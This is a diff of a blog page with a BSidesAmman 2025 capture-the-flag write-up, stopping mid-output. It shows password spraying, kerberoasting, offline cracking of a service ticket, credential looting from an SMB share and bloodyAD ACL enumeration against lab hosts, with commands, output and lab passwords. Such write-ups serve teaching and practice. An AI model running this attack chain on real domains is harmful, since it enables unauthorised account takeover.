@@ -21,7 +21,7 @@
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-05-26T00:00:00-04:00","datePublished":"2025-05-26T00:00:00-04:00","headline":"BSidesAmman Writeup EN","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/bsidesamman-2025-writeup.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/bsidesamman-2025-writeup.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=be7dccbc0f3db3646d3ca756ecc41403ada15f9e">
+    <link rel="stylesheet" href="/assets/css/style.css?v=b99973424b364da732c43665300e85039b4a5d7a">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -384,38 +384,38 @@
 <li>
 <a href="#introduction">Introduction</a>
 <ul>
-<li><a href="#disclaimer-and-scenario">Disclaimer and scenario</a></li>
-<li><a href="#required-tools">Required tools</a></li>
+<li><a href="#disclaimer-and-scenario">Disclaimer and Scenario</a></li>
+<li><a href="#required-tools">Required Tools</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#initial-access">Initial access</a>
+<a href="#initial-access">Initial Access</a>
 <ul>
-<li><a href="#credential-discovery">Credential discovery through password spraying</a></li>
+<li><a href="#password-spraying">Password Spraying</a></li>
 </ul>
 </li>
 
 <li>
 <a href="#accessing-svc_web">Accessing svc_web</a>
 <ul>
-<li><a href="#smb-share-enumeration">SMB share enumeration</a></li>
+<li><a href="#smb-share-enumeration">SMB Share Enumeration</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#authentication-as-abdullah">Authentication as abdullah.azooz</a>
+<a href="#authentication-as-abdullah">Authentication as Abdullah.Azooz</a>
 <ul>
-<li><a href="#bloodyad-enumeration">ACL enumeration with bloodyAD</a></li>
+<li><a href="#bloodyad-enumeration">ACL Enumeration</a></li>
 </ul>
 </li>
 
 <li>
-<a href="#privilege-escalation">Mustafa options</a>
+<a href="#privilege-escalation">Privilege Escalation</a>
 <ul>
-<li><a href="#targeted-kerberoasting">Gargeted kerberoasting</a></li>
-<li><a href="#shadow-credentials-attack">Ghadow credentials attack</a></li>
-<li><a href="#group-enumeration">Group enumeration through BloodyAD</a></li>
+<li><a href="#targeted-kerberoasting">Targeted Kerberoasting</a></li>
+<li><a href="#shadow-credentials-attack">Shadow Credentials Attack</a></li>
+<li><a href="#group-enumeration">Group Enumeration</a></li>
 </ul>
 </li>
 
@@ -436,17 +436,24 @@
 
 <h3 id="disclaimer-and-scenario">Disclaimer and Scenario</h3>
 
-<h4 id="original-assumed-breach-scenario">Original Assumed breach Scenario</h4>
+<p>The CTF ran across 2 days, where the scenario was slightly modified from the original one. This was done in order to maintain the integrity of the competition.</p>
 
-<p>the following credentials were given as part of an assumed breach for the internal assessment:</p>
+<h4 id="day-1---assumed-breach">Day 1 - Assumed Breach</h4>
+
+<p>The following credentials were given as part of an assumed breach for the internal assessment:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hasan.bakri@albalad.bsides.rv  
 ILoveJordan123@  
 </code></pre></div></div>
 
-<h4 id="updated-scenario">Updated Scenario</h4>
+<h4 id="day-2---unauthenticated-access">Day 2 - Unauthenticated Access</h4>
 
-<p>In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes. The hint being “Everything you need is provided to you, the username and the IPs. Go back to the basics of Active Directory attacks and enumerations” so we will be moving forward with the credentials updated scenario <code class="language-plaintext highlighter-rouge">hasan.bakri:hasan.bakri</code></p>
+<p>In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes. The hint provided was:</p>
+<ul>
+  <li>“Everything you need is provided to you, the username and the IPs. Go back to the basics of Active Directory attacks and enumerations”.</li>
+</ul>
+
+<p>The first step of the updated scenario is to authenticate to the domain controller using the username as the password. This is done using the <code class="language-plaintext highlighter-rouge">nxc</code> tool:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.2.10.11 -u 'hasan.bakri' -p 'hasan.bakri'  
 </code></pre></div></div>
@@ -473,51 +480,51 @@ Like previous writeups There is <em>nothing</em> wrong with Bloodhound, But it i
 <h2 id="initial-access">Initial Access</h2>
 <p>using the information provided, we can first fingerprint the domain.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.2.10.11'</span> <span class="o">&gt;&gt;</span> targets.txt
-<span class="nb">echo</span> <span class="s1">'10.2.10.12'</span> <span class="o">&gt;&gt;</span> targets.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo '10.2.10.11' &gt;&gt; targets.txt
+echo '10.2.10.12' &gt;&gt; targets.txt
 </code></pre></div></div>
 
-<h3 id="credential-discovery">Credential Discovery</h3>
+<h3 id="password-spraying">Password Spraying</h3>
 
 <p>The first step is password spraying, using the username as the password. This allows us to authenticate as a user and obtain the hostnames.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb targets.txt <span class="nt">-u</span> <span class="s1">'hasan.bakri'</span> <span class="nt">-p</span> <span class="s1">'hasan.bakri'</span> <span class="nt">--generate-hosts-file</span> hosts.txt
-SMB         10.2.10.11      445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>  
-SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DEV03<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>  
-SMB         10.2.10.11      445    DC01             <span class="o">[</span>+] albalad.bsides.rv<span class="se">\h</span>asan.bakri:hasan.bakri 
-SMB         10.2.10.12      445    DEV03            <span class="o">[</span>+] albalad.bsides.rv<span class="se">\h</span>asan.bakri:hasan.bakri
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --generate-hosts-file hosts.txt
+SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False)  
+SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False)  
+SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\hasan.bakri:hasan.bakri 
+SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\hasan.bakri:hasan.bakri
 Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
-<span class="nb">cat </span>hosts.txt
+cat hosts.txt
 10.2.10.11     DC01.albalad.bsides.rv albalad.bsides.rv DC0110.2.10.12     DEV03.albalad.bsides.rv DEV03
 </code></pre></div></div>
 
 <p>we can infer that the domain controller is <code class="language-plaintext highlighter-rouge">DC01.albalad.bsides.rv</code>, however we can confirm this by checking if the <code class="language-plaintext highlighter-rouge">ldap</code> service is enabled.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:albalad.bsides.rv)  
 </code></pre></div></div>
 
 <p>checking the shares on these machines, we identify a <code class="language-plaintext highlighter-rouge">svc_home$</code>.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nxc</span> <span class="n">smb</span> <span class="n">targets</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="s">'hasan.bakri'</span> <span class="o">-</span><span class="n">p</span> <span class="s">'hasan.bakri'</span> <span class="o">--</span><span class="n">shares</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DEV03</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="bp">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="bp">False</span><span class="p">)</span> 
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="bp">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="bp">False</span><span class="p">)</span> 
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span>\<span class="n">hasan</span><span class="p">.</span><span class="n">bakri</span><span class="p">:</span><span class="n">hasan</span><span class="p">.</span><span class="n">bakri</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span>\<span class="n">hasan</span><span class="p">.</span><span class="n">bakri</span><span class="p">:</span><span class="n">hasan</span><span class="p">.</span><span class="n">bakri</span> 
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPC</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.12</span>      <span class="mi">445</span>    <span class="n">DEV03</span>            <span class="n">svc_home</span><span class="err">$</span>                       <span class="n">common</span> <span class="n">directory</span> <span class="k">for</span> <span class="n">service</span> <span class="n">accounts</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPCS</span>
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">NETLOGON</span>        <span class="n">READ</span>            <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
-<span class="n">SMB</span>         <span class="mf">10.2</span><span class="p">.</span><span class="mf">10.11</span>      <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">SYSVOL</span>          <span class="n">READ</span>            <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --shares
+SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
+SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
+SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\hasan.bakri:hasan.bakri
+SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\hasan.bakri:hasan.bakri 
+SMB         10.2.10.12      445    DEV03            [*] Enumerated shares
+SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
+SMB         10.2.10.12      445    DEV03            -----           -----------     ------
+SMB         10.2.10.12      445    DEV03            ADMIN$                          Remote Admin
+SMB         10.2.10.12      445    DEV03            C$                              Default share
+SMB         10.2.10.12      445    DEV03            IPC$            READ            Remote IPC
+SMB         10.2.10.12      445    DEV03            svc_home$                       common directory for service accounts
+SMB         10.2.10.11      445    DC01             [*] Enumerated shares
+SMB         10.2.10.11      445    DC01             Share           Permissions     Remark
+SMB         10.2.10.11      445    DC01             -----           -----------     ------
+SMB         10.2.10.11      445    DC01             ADMIN$                          Remote Admin
+SMB         10.2.10.11      445    DC01             C$                              Default share
+SMB         10.2.10.11      445    DC01             IPC$            READ            Remote IPCS
+SMB         10.2.10.11      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.2.10.11      445    DC01             SYSVOL          READ            Logon server share
 </code></pre></div></div>
 
 <p>we can infer that the <code class="language-plaintext highlighter-rouge">svc_home$</code> share would belongs to service accounts.</p>
@@ -528,32 +535,32 @@ Running nxc against 2 targets ━━━━━━━━━━━━━━━━�
 
 <p>next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline (known as a <code class="language-plaintext highlighter-rouge">kerberoasting</code> attack.)</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py <span class="s1">'albalad.bsides.rv'</span>/<span class="s1">'hasan.bakri'</span>:<span class="s1">'hasan.bakri'</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri'
 Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
-ServicePrincipalName                   Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation <span class="nt">-------------------------------------</span>  <span class="nt">-------</span>  <span class="nt">-------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
-HTTP/W-SVR-02.albalad.bsides.rv:80     svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
-HTTP/W-SVR-01.albalad.bsides.rv:80     svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
-MSSQLSvc/SQL02.albalad.bsides.rv:1433  svc_sql  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
-MSSQLSvc/SQL01.albalad.bsides.rv:1433  svc_sql  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
-VDI/vdi.albalad.bsides.rv:41440        svc_vdi  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:09.803337  &lt;never&gt;               
-TERMSRV/vdi.albalad.bsides.rv:3389     svc_vdi  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:09.803337  &lt;never&gt; 
+ServicePrincipalName                   Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation -------------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
+HTTP/W-SVR-02.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
+HTTP/W-SVR-01.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
+MSSQLSvc/SQL02.albalad.bsides.rv:1433  svc_sql  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
+MSSQLSvc/SQL01.albalad.bsides.rv:1433  svc_sql  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
+VDI/vdi.albalad.bsides.rv:41440        svc_vdi  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:09.803337  &lt;never&gt;               
+TERMSRV/vdi.albalad.bsides.rv:3389     svc_vdi  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:09.803337  &lt;never&gt; 
 </code></pre></div></div>
 
 <p>We see that it is slightly odd that none of the service accounts have logged on, but it could be alright if they are only ran as services. all of the users can be kerberoasted, but we will only focus on <code class="language-plaintext highlighter-rouge">svc_web</code> for now.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py <span class="s1">'albalad.bsides.rv'</span>/<span class="s1">'hasan.bakri'</span>:<span class="s1">'hasan.bakri'</span> <span class="nt">-request-user</span> <span class="s1">'svc_web'</span> <span class="nt">-outputfile</span> <span class="s1">'svc_web.tgs'</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri' -request-user 'svc_web' -outputfile 'svc_web.tgs'
 Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
-ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation <span class="nt">----------------------------------</span>  <span class="nt">-------</span>  <span class="nt">-------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
-HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
-HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;  
+ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation ----------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
+HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
+HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  &lt;never&gt;  
 </code></pre></div></div>
 
 <p>This ticket can be cracked offline with <code class="language-plaintext highlighter-rouge">john</code>, or <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt svc_web.tgs 
-Using default input encoding: UTF-8Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>  
-Will run 4 OpenMP threadsPress <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
-webkinz1         <span class="o">(</span>?<span class="o">)</span>     1g 0:00:00:00 DONE <span class="o">(</span>2025-04-28 13:01<span class="o">)</span> 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s dumbo..redcatUse the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt svc_web.tgs 
+Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status
+webkinz1         (?)     1g 0:00:00:00 DONE (2025-04-28 13:01) 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s dumbo..redcatUse the "--show" option to display all of the cracked passwords reliably
 Session completed.
 </code></pre></div></div>
 
@@ -561,16 +568,16 @@ Session completed.
 
 <p>Using the <code class="language-plaintext highlighter-rouge">svc_web</code> account, we can enumerate the shares again and find that we now have access to <code class="language-plaintext highlighter-rouge">svc_home$</code>.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb DEV03.albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'svc_web'</span> <span class="nt">-p</span> <span class="s1">'webkinz1'</span> <span class="nt">--shares</span>
-SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DEV03<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
-SMB         10.2.10.12      445    DEV03            <span class="o">[</span>+] albalad.bsides.rv<span class="se">\s</span>vc_web:webkinz1 
-SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb DEV03.albalad.bsides.rv -u 'svc_web' -p 'webkinz1' --shares
+SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
+SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\svc_web:webkinz1 
+SMB         10.2.10.12      445    DEV03            [*] Enumerated shares
 SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
-SMB         10.2.10.12      445    DEV03            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
-SMB         10.2.10.12      445    DEV03            ADMIN<span class="nv">$ </span>                         Remote Admin
-SMB         10.2.10.12      445    DEV03            C<span class="nv">$ </span>                             Default share
-SMB         10.2.10.12      445    DEV03            IPC<span class="nv">$ </span>           READ            Remote IPC
-SMB         10.2.10.12      445    DEV03            svc_home<span class="nv">$ </span>      READ,WRITE      common directory <span class="k">for </span>service accounts
+SMB         10.2.10.12      445    DEV03            -----           -----------     ------
+SMB         10.2.10.12      445    DEV03            ADMIN$                          Remote Admin
+SMB         10.2.10.12      445    DEV03            C$                              Default share
+SMB         10.2.10.12      445    DEV03            IPC$            READ            Remote IPC
+SMB         10.2.10.12      445    DEV03            svc_home$       READ,WRITE      common directory for service accounts
 </code></pre></div></div>
 
 <p>We can begin looting this share, and find credentials in <code class="language-plaintext highlighter-rouge">\\svc_home$\svc_home$\svc_web\config.php</code></p>
@@ -588,18 +595,18 @@ define('DB_NAME', 'web_db');
 <h2 id="authentication-as-abdullah">Authentication as Abdullah</h2>
 <p>We find that these credentials are valid for the domain.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb dc01.albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'abdullah.azooz'</span> <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span>
-SMB         10.2.10.11      445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
-SMB         10.2.10.11      445    DC01             <span class="o">[</span>+] albalad.bsides.rv<span class="se">\a</span>bdullah.azooz:PetraEnjoyer1950
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb dc01.albalad.bsides.rv -u 'abdullah.azooz' -p 'PetraEnjoyer1950'
+SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
+SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\abdullah.azooz:PetraEnjoyer1950
 </code></pre></div></div>
 
-<h3 id="bloodyad-enumeration">BloodyAD Enumeration</h3>
-<p>Then we can see that this user has an outbound ACL to mustafa.yaseen</p>
+<h3 id="acl-enumeration">ACL Enumeration</h3>
+<p>Then we can see that this user has an outbound access control list (ACL) over the <code class="language-plaintext highlighter-rouge">mustafa.yaseen</code> user.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD <span class="nt">--host</span> 10.2.10.11 <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'abdullah.azooz'</span>  <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> get writable  
-distinguishedName: <span class="nv">CN</span><span class="o">=</span>abdullah.azooz,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE  
